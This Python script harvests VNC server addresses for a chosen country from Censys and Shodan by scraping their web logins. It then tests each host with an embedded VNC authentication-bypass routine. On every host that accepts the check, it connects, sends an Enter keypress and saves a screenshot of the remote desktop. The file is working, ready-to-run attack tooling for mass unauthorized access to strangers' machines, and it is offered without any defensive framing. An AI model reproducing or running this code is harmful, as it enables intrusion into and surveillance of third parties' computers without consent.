import requests
from threading import Thread
import re
import subprocess
import os
import socket
import struct
import sys
import argparse
from vncdotool import api
from cv2 import imread, countNonZero
from Crypto.Cipher import DES
from time import sleep
class Censys:
    def __init__(self):
        self.session = requests.session()
        self.session.headers = {
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
        }
        self.tokenRE = re.compile(r'token.*value="(\w*)"')
        self.queryResultsRe = re.compile(r'ipv4/([\w.]*).*?system.*? (.*?)<.*?location.*? (.*?)<.*?protocols".*? (.*?)<', flags=re.DOTALL)
        self.loggedIn = False
    def login(self, user, pwd):
        token = re.search(self.tokenRE, self.session.get("https://censys.io/login").text).group(1)
        data = {
            "csrf_token": token,
            "came_from": "/",
            "from_censys_owned_external": "False",
            "login": user,
            "password": pwd
        }
        if self.session.post("https://censys.io/login", data).status_code == 401 :
            print("Censys: Incorrect login info!")
            return False
        self.loggedIn = True
        print(f"Censys: Logged in as {user}!")
        return True
    def search(self, dataReturn, query, pageCount, searchRate = 3):
        if not self.loggedIn:
            print("Censys: Not logged in yet!")
            return None
        print("Censys: starting search")
        page = self.session.get("https://censys.io/ipv4/_search", params={'q': query}).content.decode('utf-8')
        if page is '':
            return None
        numOfPages = int(re.search(r'Page.*?/(\w*)', page).group(1))
        data = re.findall(self.queryResultsRe, page)
        for (ip, name, location, protocols) in data:
            dataReturn.append({"ip": ip, "name": name, "location": location, "protocols": [s for s in protocols.split(", ")]})
        ContinueTilPages = min(pageCount, numOfPages)
        if (ContinueTilPages > 1):
            nextPage = 2
            while(ContinueTilPages >= nextPage):
                page = self.session.get("https://censys.io/ipv4/_search", params={'q': query, 'page': nextPage}).content.decode('utf-8')
                data = re.findall(self.queryResultsRe, page)
                for (ip, name, location, protocols) in data:
                    dataReturn.append({"ip": ip, "name": name, "location": location, "protocols": [s for s in protocols.split(", ")]})
                nextPage += 1
                sleep(searchRate)
        print("Censys: Done!")
class Shodan:
    def __init__(self):
        self.session = requests.session()
        self.session.headers = {
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
        }
        self.tokenRE = re.compile(r'token.*value="(\w*)"')
        self.loggedIn = False
    def login(self, user, pwd):
        token = re.search(self.tokenRE, self.session.get("https://account.shodan.io/login").text).group(1)
        data = {
            "username": user,
            "password": pwd,
            "grant_type": "password",
            "continue": "https://account.shodan.io/",
            "csrf_token": token,
            "login_submit": "Login"
        }
        if self.session.post("https://account.shodan.io/login", data).content.decode('utf-8').find("error") != -1:
            print("Shodan: Incorrect login info!")
            with open("fil.html", 'wb') as f:
                f.write(self.session.get("https://account.shodan.io/").content)
            return False
        self.loggedIn = True
        print(f"Shodan: Logged in as {user}!")
        return True
    def search(self, dataReturn, query, pageCount = 2, searchRate = 0.5):
        if not self.loggedIn:
            print("Censys: Not logged in yet!")
            return None
        print("Shodan: starting search")
        subIpRe = re.compile(r'class="ip".*?\/host\/(.*?)"')
        infoRe = re.compile(r'>Country.*?th>(.*?)<.*?>Organ.*?th>(.*?)<', re.DOTALL)
        portsRe = re.compile(r'"port">(\w*).*?main">.*?>([\w\W]*?)(?:\n|\r|<)', re.DOTALL)
        for i in range(1,pageCount + 1): #returns 20 results max normally :(
            page = self.session.get("https://www.shodan.io/search", params={'query': query, 'page': str(i)}).content.decode('utf-8')
            pages = re.findall(subIpRe, page)
            sleep(searchRate)
            for subPage in pages:
                subp = self.session.get("https://www.shodan.io/host/" + subPage).content.decode('utf-8')
                data = re.findall(infoRe, subp)
                ports = re.findall(portsRe, subp)
                ports = [f"{po}/{pr}" for (po, pr) in ports]
                for (country, organ) in data:
                    dataReturn.append({"ip": subPage, "country": country, "organization": organ, "protocols": ports})
                sleep(searchRate)
        print("Shodan: Done!")
def getVNCports(data): #here 'data' is the output of the search func(list of dicts), returns a modified version of 'data' with just vnc ports
    for one in data:
        one["protocols"] = [x for x in one["protocols"] if 'vnc' in x.lower() or 'rfb 003.008' in x.lower()]
#################################################################################### IMPORTED
#copyright 2014 curesec gmbh, ping@curesec.com

# tested with RFB 003.008

# http://www.realvnc.com/docs/rfbproto.pdf

# return status
# status 0 = success ("none" authentication method)
# status 1 = success (good password)
# status 2 = bad password
# status 3 = bad configuration (wrong version, wrong security type)
# status 4 = bad connection
# status 5 = too many failures
def test_vnc_authentication_bypass(server, port, timeout, verbose):
    try:
        ip = socket.gethostbyname(server)
    except socket.error as e:
        print (e)
        return 4
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
    except socket.error as e:
        print(f'Auth Check: Cannot connect to {ip}:{port}')
        print (e)
        return 4
    print(f'Auth Check: Connected to {server}:{port}')

    # 11111
    # first, the server sends its RFB version, 12 bytes
    # more than 12 bytes if too many failures
    try:
        data = s.recv(1024)
    except socket.error as e:
        print (e)
        return 4
    if verbose:
        print(f'Auth Check: Received [{len(data)}] version: {data}')
    if len(data) > 12:
        return 5
    if not data.startswith("RFB 003.00".encode()):
        return 3



    # 22222
    # now, the client sends the RFB version 3.8, 12 bytes
    # RFB version 3.3 does not let the client choose the security type
    m = "RFB 003.008\n"
    if verbose:
        print(f'Auth Check: Received [{len(m)}] version: {m}')
    try:
        s.send(m.encode())
    except socket.error as e:
        print (e)
        return 4
    # 33333
    # now, the server sends the security types
    try:
        data = s.recv(1024)
    except socket.error as e:
        print (e)
        return 4
    if verbose:
        print (f'Auth Check: Received [{len(data)}] version: {data}')
    try:
        number_of_security_types = struct.unpack("!B", str(data[0]).encode())[0]
    except: #TODO: fix this, don't know why it happens(probably server sends and empty response? no idea) currently just returns 11
        return 11
    if verbose:
        print(f'Auth Check: Number of security types: {number_of_security_types}')
    if number_of_security_types == 0:
        # no security types supported
        # something went wrong
        # perhaps server does not support RFB 3.8
        return 3
    # checking whether Null authentication available
    # if so, no need for exploit
    for i in range(1, number_of_security_types + 1):
        if i >= len(data):
            # should not happen, but don't want to cause an exception
            break
        try:
            security_type = struct.unpack("!B", str(data[i]).encode())[0]
            # security type 1 = None
            # security type 2 = VNC
            # security type 16 = Tight
            # security type 18 = TLS
            # security type 19 = VeNCrypt
            # plus some more
        except:  #TODO: fix this, don't know why it happens. currently just returns 11
            return 11
        if security_type == 1:
            return 0
    # 44444
    # now, the client selects the None (1) security type, 1 byte
    m = struct.pack("!B", 1)
    if verbose:
        print(f'Auth Check: Sending [{len(m)}] security type: {m}')
    try:
        s.send(m)
    except socket.error as e:
        print (e)
        return 4


    # 77777
    # now, the server sends an ok or fail
    # if not vulnerable, server might quit connection and not send anything
    # 0 == OK, 1 == failed
    try:
        data = s.recv(4)
    except socket.error as e:
        print (e)
        return 4
    if verbose:
        print(f'Auth Check: Received [{len(data)}] security result: {data}')
    if len(data) < 4:
        return 3
    result = struct.unpack("!I", data)[0]
    if result == 0:
        # good password
        return 1
    elif result == 1:
        # bad password
        return 2
    else:
        # protocol error
        return 3
# if status == 0:	
#     print ("\"None\" authentication method detected")
# elif status == 1:
#     print ("Authentication bypass successful")
# elif status == 2:
#     print ("Authentication bypass failed")
# elif status == 3:
#     print ("Protocol error")
# elif status == 4:
#     print ("Network error")
# elif status == 5:
#     print ("Too many failures")
# elif status == 11:
#     print("UNKNOWN")
####################################################################################

portRawRe = re.compile(r"(\w*)\/")
#take screenshots from a vnc server. Input is a list of datas, also can choose to omit black screens(omit by default)
#SEND ENTER KEY FOR EXP BEFORE SCREENSHOT
def screenshotGet(datas, timeout, screenshotDir, includeBlackScreens): 
    try:
        #create snapshot dir
        saveDir = os.path.join(os.path.dirname(os.path.realpath(__file__)), screenshotDir)
        if os.path.isdir(saveDir):
            pass
        else:
            os.mkdir(saveDir)
    except OSError:
        print("Screenshot: Failed to create dir")
        return False
    print(f"Screenshot: Saving screenshots in {screenshotDir} directory..")
    for data in datas:
        for proto in data["protocols"]:
            protocol = re.search(portRawRe, proto).group(1)
            try:
                client = api.connect(f"{data['ip']}::{protocol}", password=None)
                client.timeout = timeout + 0.5
                client.keyPress('enter')
                sleep(0.5) #for the enter key press to have some effect maybe
                imgDir = os.path.join(saveDir, f"{data['ip']}:{protocol}.jpg")
                client.captureScreen(imgDir)
                if not includeBlackScreens:
                    image = imread(imgDir, 0)
                    if countNonZero(image) == 0:
                        os.remove(imgDir)
                        print(f"Screenshot: Black for {data['ip']}:{protocol}, removing..")
                        continue
            except TimeoutError:
                print(f"Screenshot: Timeout for {data['ip']}:{protocol}, skipping..")
                continue
            except:
                print(f"Screenshot: Error for {data['ip']}:{protocol}, skipping..")
                continue
            print(f"Screenshot: Done for {data['ip']}:{protocol}")
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        allow_abbrev=False, description="Search for open VNC servers (and take screenshots) based on Censys and Shodan search results")
    parser.add_argument('-c', metavar="country-code", action='store',
                        type=str, required=True, 
                        help="Country code to scan")
    parser.add_argument('-uC', metavar="user:pass", action='store',
                        type=str, required=True, 
                        help="Login information for Censys account")
    parser.add_argument('-uS', metavar="user:pass", action='store',
                        type=str, required=True, 
                        help="Login information for Shodan account")
    parser.add_argument('-t', metavar="timeout", action='store', type=int, default=7,
                        help='Connection timeout - default 7s)')
    parser.add_argument('-f', metavar="folder", action='store', type=str, default="VNC_Screenshots",
                        help='Folder to save to - default VNC_Screenshots)')
    parser.add_argument('-p', metavar="number", action='store', type=int, default="3",
                        help='Number of pages to parse - default 3)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Increase verbosity')
    parser.add_argument('-k', '--keep', action='store_true',
                        help='Keep full-black screenshots - off by default')
    args = parser.parse_args()
    # print(args)
    # quit()
    shodan = Shodan()
    if not shodan.login(args.uS.split(':')[0], args.uS.split(':')[1]):
        quit()
    censys = Censys()
    if not censys.login(args.uC.split(':')[0], args.uC.split(':')[1]):
        quit()
    print("Main: Grabbing info..")
    try:
        data = []
        t1 = Thread(target = censys.search, args=(data, 
        f"(5900.vnc.banner.screen.framebuffer_width: [0 TO 5000] \
        or 5901.vnc.banner.screen.framebuffer_width: [0 TO 5000] \
        or 5902.vnc.banner.screen.framebuffer_width: [0 TO 5000]) \
        and location.country_code: {args.c}", args.p))
        t2 = Thread(target = shodan.search, args=(data, 
        f'"authentication+disabled"+"RFB+003.008"+country:{args.c}'))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        """You could import data variable from any other source:
            It is a list of dictionaries, each dictionary must have an 'ip' and 'protocols' element, the protocols element itself is a list of ports with vnc on them 
        """
    except KeyboardInterrupt:
        print("Main: Canceled info grabbing..")
    except:
        print("Error occured in gathering info, make sure your user isn't rate limited")
        quit()
    if data is None:
        print('Main: No result for query')
        quit()
    getVNCports(data)
    #clear repetitions:
    delList = []
    for i in range(0, len(data)):
        for j in range(i+1, len(data)):
            if data[i]['ip'] == data[j]['ip']:
                #append if there are any non-repeating ports
                sub1 = [re.search(portRawRe, x).group(1) for x in data[i]['protocols']]
                for sub2 in data[j]['protocols']:
                    if re.search(portRawRe, sub2).group(1) in sub1:
                        data[i]['protocols'].append(sub2)
                delList.append(j)
    if delList is not None:
        delNum = 0
        for i in delList:
            del data[i-delNum]
            delNum = delNum + 1
    print("Main: Data acquired, proceeding with auth test..")
    #loops through all results, test for open ports, and modifies 'data' to only include open ports, empty list saved otherwise
    for each in data:
        portsToRemove = list()
        for port in each['protocols']:
            portnum = int(re.search(portRawRe, port).group(1))
            status = test_vnc_authentication_bypass(each['ip'], portnum, args.t, args.verbose)
            if status is 1:
                if args.verbose:
                    print("Main: Authentication bypass successful")
            elif status is 0:
                if args.verbose:
                    print("Main: \"None\" authentication method detected")
            else:
                if args.verbose:
                    print(f'Main: Not open with status {status}')
                portsToRemove.append(port)
        each['protocols'] = [x for x in each['protocols'] if x not in portsToRemove]
    # final data to be printed
    if args.verbose:
        print("Main: results: ")
        print(data)
    screenshotGet(data, args.t, args.f, args.keep)
